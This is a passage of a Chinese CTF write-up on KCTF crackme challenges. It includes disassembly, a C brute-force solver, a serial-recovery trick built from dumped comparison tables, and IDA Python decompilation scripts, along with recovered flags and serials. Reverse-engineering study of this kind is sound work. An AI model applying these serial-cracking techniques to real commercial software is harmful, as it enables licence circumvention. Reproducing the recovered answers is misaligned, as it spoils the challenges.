class="line">1400EACB4   mov ecx,eax                      </span><br><span class="line">140080A4A   mov rdx,rcx                      </span><br><span class="line">1400A7967   sub rdx,qword ptr ss:[rsp+78]    </span><br><span class="line">1400517AC   mov qword ptr ss:[rsp+78],rdx    &#x2F;&#x2F;[rsp+78] &#x3D; -[rsp+78]</span><br><span class="line">14000B3C6   sub rcx,qword ptr ss:[rsp+70]    </span><br><span class="line">14008DA3A   mov qword ptr ss:[rsp+70],rcx    &#x2F;&#x2F;[rsp+70] &#x3D; -[rsp+70]</span><br><span class="line"></span><br><span class="line">1400B368C   mov rax,qword ptr ss:[rsp+70]    </span><br><span class="line">140079E70   add rax,29                       </span><br><span class="line">1400DE855   mov qword ptr ss:[rsp+70],rax    &#x2F;&#x2F;[rsp+70] +&#x3D; 0x29</span><br><span class="line">14007C0C8   imul rax,qword ptr ss:[rsp+70],2A</span><br><span class="line">1400DC9B8   lea rcx,qword ptr ss:[rsp+C0]    &#x2F;&#x2F;[rsp+C0] &#x3D;&#x3D; table</span><br><span class="line">140038FE8   add rcx,rax                      </span><br><span class="line">140067202   mov rax,qword ptr ss:[rsp+78]    </span><br><span class="line">14008B8FD   test byte ptr ds:[rcx+rax],1     &#x2F;&#x2F;table[[rsp+70] * 0x2a + [rsp+78]] &#x3D;&#x3D; 1  -&gt; gg</span><br><span class="line">140063B11   je patch3.140063B2A</span><br></pre></td></tr></table></figure><p>转成伪代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ih = input_hex</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">42</span>*<span class="number">2</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">2</span>,<span class="number">42</span>*<span class="number">2</span>,<span class="number">2</span>):</span><br><span class="line">        v70 = ih[j] - ih[i]</span><br><span class="line">        v78 = ih[j+<span class="number">1</span>] - ih[i+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> v78 &lt; <span class="number">0</span> :</span><br><span class="line">            v78 = -v78</span><br><span class="line">            v70 = -v70</span><br><span class="line">        index = (v70 + <span class="number">41</span>) * <span class="number">42</span> + v78 </span><br><span class="line"><span class="keyword">if</span> table[index] != <span class="number">0</span>:</span><br><span class="line">table[index] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            GG</span><br></pre></td></tr></table></figure><p>结合题目描述 这应该是模拟了一个棋盘 而 input_hex 每两位是一个 point(x,y)</p><p>棋盘大小是 42<em>42 也就是题目所提示的 36\</em>49</p><p>而落子方式并非简单的 x,y 代入 而是以任意两点为基础</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y &#x3D; (y&#39; - y &lt; 0) ?  flag &#x3D; 1, y - y&#39; : y&#39; - y</span><br><span class="line">X &#x3D; (flag &#x3D;&#x3D; 1 ? x - x&#39; : x&#39; - x) + 41</span><br></pre></td></tr></table></figure><p>按此方式落子 若不重复 且全部子落完即可满足条件</p><p>考虑到用爆破来解这个题复杂度一定很高 而且也有可能有多解</p><p>猜测后面还有限制条件没找到</p><h4 id="0x15-多解检查"><a href="#0x15-多解检查" class="headerlink" title="0x15 多解检查"></a>0x15 多解检查</h4><p>再在外层循环判断尾的时候直接跳过 trace 赫然就发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">140039540lea rcx,qword ptr ss:[rsp+1010] </span><br><span class="line">1400CE591lea rdx,qword ptr ds:[140004521]</span><br><span class="line">&#x2F;&#x2F;140004521&quot;02152S3X4Z5Q6C7T819&#x2F;ADB%C*DL&quot;</span><br><span class="line">14004CACFmov r8d,1C                      </span><br><span class="line">14004FED9call qword ptr ds:[&lt;&amp;strncmp&gt;]  </span><br><span class="line"></span><br><span class="line">140021803cmp rcx,0</span><br></pre></td></tr></table></figure><p>把比较结果再改掉 发现直接提示成功了</p><p>说明到这里程序的所有逻辑就已经完全 dump 完了</p><p>接下来就是如何解的问题了</p><h3 id="0x2-解局"><a href="#0x2-解局" class="headerlink" title="0x2 解局"></a>0x2 解局</h3><p>利用以上已知条件直接模拟爆破即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> table[] = <span class="string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+-*/%="</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = <span class="string">"02152S3X4Z5Q6C7T819/ADB%C*DL"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">finx</span><span class="params">(<span class="keyword">char</span> tofind)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tofind == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; table[i]; ++i)</span><br><span class="line">        <span class="keyword">if</span> (table[i] == tofind)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">toc</span><span class="params">(<span class="keyword">int</span> ind)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> table[ind];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> index, <span class="keyword">char</span> <span class="built_in">fill</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; ++i)</span><br><span class="line">        <span class="keyword">if</span> (flag[i * <span class="number">2</span> + <span class="number">1</span>] == <span class="built_in">fill</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//false if again</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> ctable[<span class="number">5000</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index * <span class="number">2</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x = flag[i],</span><br><span class="line">            y = flag[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">2</span>; j &lt; index * <span class="number">2</span>; j += <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> x_ = flag[j],</span><br><span class="line">                y_ = flag[j + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> tmp = y_ - y,</span><br><span class="line">                tmp2 = x_ - x;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                tmp = -tmp;</span><br><span class="line">                tmp2 = -tmp2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> indx = (tmp2 + <span class="number">41</span>) * <span class="number">42</span> + tmp;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ctable[indx] == <span class="number">0</span>)</span><br><span class="line">                ctable[indx] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//check down</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span> (!flag[i * <span class="number">2</span> + <span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            index = i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span> * <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag[i] != <span class="number">0</span>)</span><br><span class="line">            flag[i] = finx(flag[i]);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            flag[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = index / <span class="number">2</span>; j &lt; <span class="number">42</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> fflag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> st = flag[index];</span><br><span class="line">        <span class="keyword">if</span> (st != <span class="number">-1</span>)<span class="comment">//pass the wrong way</span></span><br><span class="line">            st += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            st = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = st; i &lt; <span class="number">42</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (check(index / <span class="number">2</span>, i))</span><br><span class="line">            &#123;</span><br><span class="line">                fflag = <span class="number">1</span>;</span><br><span class="line">                flag[index] = i;</span><br><span class="line">                index += <span class="number">2</span>;</span><br><span class="line">                flag[index] = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!fflag)<span class="comment">//in this index all is cant check,so ret after</span></span><br><span class="line">        &#123;</span><br><span class="line">            j -= <span class="number">2</span>;</span><br><span class="line">            index -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span> * <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = toc(flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; ++i)</span><br><span class="line">        flag[i * <span class="number">2</span>] = toc(i);</span><br><span class="line">    slove();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概20分钟可以爆破出来 懒得优化了 可以了</p><h2 id="第七题-千里寻跟"><a href="#第七题-千里寻跟" class="headerlink" title="第七题 千里寻跟"></a>第七题 千里寻跟</h2><h2 id="第八题-众叛亲离"><a href="#第八题-众叛亲离" class="headerlink" title="第八题 众叛亲离"></a>第八题 众叛亲离</h2><blockquote><p>非预期解,利用了作者留下的漏洞(作者可能没想到?</p></blockquote><h3 id="入局"><a href="#入局" class="headerlink" title="入局"></a>入局</h3><p>这题 IDA 直接 F5 不了,说 too big funtion</p><p>百度解决了以后 经过漫长的反编译</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600536/0" alt=""></p><p>终于反编译出了看不懂的15000余行代码!!</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600663/0" alt=""></p><p>通过字符串勉强找到了输入的地方</p><p>但是后面完全看不太懂的样子</p><p>看了graph 果然和题目名字非常的贴合</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600712/0" alt=""></p><p>好了 可以丢进回收站了</p><h3 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h3><p>过了不久看见群里居然有人拿了一血了！！！</p><p>既然能在这么短时间内做出来,说明肯定不是常规解流程的,也就是说程序留有漏洞！</p><p>把题目从回收站里拿出来</p><p>通过字符串找到有可能是判断的地方</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600787/0" alt=""></p><p>拿真码断一下 可以分析出</p><p>当ecx指向的位置为</p><p>00 00 00 01 00 02 00 03 …. 00 07</p><p>验证成功</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600871/0" alt=""></p><p>尝试随便改动一位serial</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600952/0" alt=""></p><p>更改了倒数第三位 可以看到 比较的序列只有1位改动了！！！</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600997/0" alt=""></p><p>更改了倒数第四位 比较的序列号还是只有一位改动了！！！</p><p>即可且仔细观察可以发现 这里像是一个映射表的关系</p><p>serial的每一位对应着比较的半个比特</p><p>带着这个猜测 再多比较了几次 发现确实是这样</p><h3 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h3><p>那不就好办了</p><p>只要name输入为KCTF</p><p>然后dump出000000….    11111….  fffff….的比较序列</p><p>再把要求的00 00 00 01 00 02 00 03 …. 00 07所对应的找到组合起来</p><p>就可以得到正确的serial</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">00000000000000000000000000000000</span><br><span class="line">85A4A5E55B399224E3F9715B80BA999C</span><br><span class="line"></span><br><span class="line">11111111111111111111111111111111</span><br><span class="line">94B5B4F44A288335F2E8604A91AB888D</span><br><span class="line"></span><br><span class="line">22222222222222222222222222222222</span><br><span class="line">A78687C7791BB006C1DB5379A298BBBE</span><br><span class="line"></span><br><span class="line">33333333333333333333333333333333</span><br><span class="line">B69796D6680AA117D0CA4268B389AAAF</span><br><span class="line"></span><br><span class="line">44444444444444444444444444444444</span><br><span class="line">C1E0E1A11F7DD660A7BD351FC4FEDDD8</span><br><span class="line"></span><br><span class="line">55555555555555555555555555555555</span><br><span class="line">D0F1F0B00E6CC771B6AC240ED5EFCCC9</span><br><span class="line"></span><br><span class="line">66666666666666666666666666666666</span><br><span class="line">E3C2C3833D5FF442859F173DE6DCFFFA</span><br><span class="line"></span><br><span class="line">77777777777777777777777777777777</span><br><span class="line">F2D3D2922C4EE553948E062CF7CDEEEB</span><br><span class="line"></span><br><span class="line">88888888888888888888888888888888</span><br><span class="line">0D2C2D6DD3B11AAC6B71F9D308321114</span><br><span class="line"></span><br><span class="line">99999999999999999999999999999999</span><br><span class="line">1C3D3C7CC2A00BBD7A60E8C219230005</span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">2F0E0F4FF193388E4953DBF12A103336</span><br><span class="line"></span><br><span class="line">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">3E1F1E5EE082299F5842CAE03B012227</span><br><span class="line"></span><br><span class="line">CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br><span class="line">4968692997F55EE82F35BD974C765550</span><br><span class="line"></span><br><span class="line">DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line">5879783886E44FF93E24AC865D674441</span><br><span class="line"></span><br><span class="line">EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE</span><br><span class="line">6B4A4B0BB5D77CCA0D179FB56E547772</span><br><span class="line"></span><br><span class="line">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">7A5B5A1AA4C66DDB1C068EA47F456663</span><br></pre></td></tr></table></figure><blockquote><p>00000001000200030004000500060007<br>85A4A5E45B3B9227E3FD715E80BC999B</p></blockquote><p>验证正确！！！</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599601072/0" alt=""></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个题居然就这样做出来了,如果是作者是没想到这一点的话,那可真是太可惜了,感觉这题应该是一个非常有难度的题目的.</p><h2 id="第九题-平定战乱"><a href="#第九题-平定战乱" class="headerlink" title="第九题 平定战乱"></a>第九题 平定战乱</h2><p>这是一道 pwn 题</p><h2 id="第十题-一统江湖"><a href="#第十题-一统江湖" class="headerlink" title="第十题 一统江湖"></a>第十题 一统江湖</h2><p>分离大函数并反编译到文件的 python 代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(address,table)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">        <span class="keyword">if</span> table[i] != <span class="string">'?'</span>:</span><br><span class="line">            <span class="keyword">if</span> ida_bytes.get_byte( address+ i) == table[i]:</span><br><span class="line">                <span class="keyword">if</span> i == len(table) - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makenode</span><span class="params">()</span>:</span></span><br><span class="line">    st = <span class="number">0x401610</span></span><br><span class="line">    end = <span class="number">0x6cbf52</span></span><br><span class="line">    table = [<span class="number">3</span>,<span class="string">'?'</span>,<span class="number">8</span>,<span class="number">0x8A</span>,<span class="string">'?'</span>,<span class="number">0xFF</span>,<span class="number">0x88</span>]</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    node = [<span class="string">'node_0 : 0x401610, '</span>]</span><br><span class="line">    <span class="keyword">while</span> st &lt; end:</span><br><span class="line">        <span class="keyword">if</span> search( st, table) == <span class="number">1</span>:</span><br><span class="line">            funend = str(hex(st + <span class="number">8</span>))</span><br><span class="line">            node[<span class="number">-1</span>] += funend</span><br><span class="line">            node.append(<span class="string">'node_'</span> + str(count) + <span class="string">' : '</span> + funend + <span class="string">', '</span>)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        st += <span class="number">1</span></span><br><span class="line">    node.pop()</span><br><span class="line">    <span class="keyword">return</span> node</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makefun</span><span class="params">()</span>:</span></span><br><span class="line">    del_func(<span class="number">0x401610</span>)</span><br><span class="line">    nodes = makenode()</span><br><span class="line">    f = open(<span class="string">'decompile.txt'</span>,<span class="string">'a+'</span>)</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">        tmp = node.split(<span class="string">' : '</span>)<span class="comment">#['node_0', '0x401610, 0x405b92']</span></span><br><span class="line">        name = tmp[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        tmp2 = tmp[<span class="number">1</span>].split(<span class="string">', '</span>)</span><br><span class="line">        st  = int(tmp2[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">        end = int(tmp2[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'node_127'</span>:</span><br><span class="line">            end += <span class="number">4</span></span><br><span class="line">        idc.set_name(st, name)</span><br><span class="line">        add_func(st,end)</span><br><span class="line">        set_frame_size(st,<span class="number">0x3C9F0</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        set_func_attr(st, <span class="number">8</span>, <span class="number">0x1410</span>)<span class="comment">#bp based frame</span></span><br><span class="line">        f.write(str(idaapi.decompile(st)))</span><br><span class="line">        <span class="comment">#print('set func ' + name + ' at [ ' + str(hex(st)) + ', ' + str(hex(end)) + ']')</span></span><br><span class="line">        <span class="comment">#get_func_attr(st,16)</span></span><br><span class="line">        <span class="comment">#0:start 4:end 8:flags 36:颜色</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">makefun()</span><br></pre></td></tr></table></figure><p>将反编译整合成128个式子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, time, sys, re</span><br><span class="line"><span class="comment">#cd desktop &amp;&amp;python3 test.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FAR</span><span class="params">(string,fed)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ind = string.find(fed)</span><br><span class="line">        <span class="keyword">if</span> ind == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        rightcount = <span class="number">0</span></span><br><span class="line">        leftcount  = <span class="number">0</span></span><br><span class="line">        index = ind</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> string[ind+<span class="number">2</span>] != <span class="string">'('</span>:</span><br><span class="line">            <span class="keyword">if</span> fed == <span class="string">'&lt;'</span>:</span><br><span class="line">                right = string[ind:].find(<span class="string">']'</span>) + ind</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>  string[ind+<span class="number">3</span>] != <span class="string">'('</span>:</span><br><span class="line">            <span class="keyword">if</span> fed == <span class="string">'&gt;='</span>:</span><br><span class="line">                right = string[ind:].find(<span class="string">']'</span>) + ind</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> string[ind:]:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="string">'('</span>:</span><br><span class="line">                    leftcount += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> i == <span class="string">')'</span>:</span><br><span class="line">                    rightcount +=<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> leftcount != <span class="number">0</span> <span 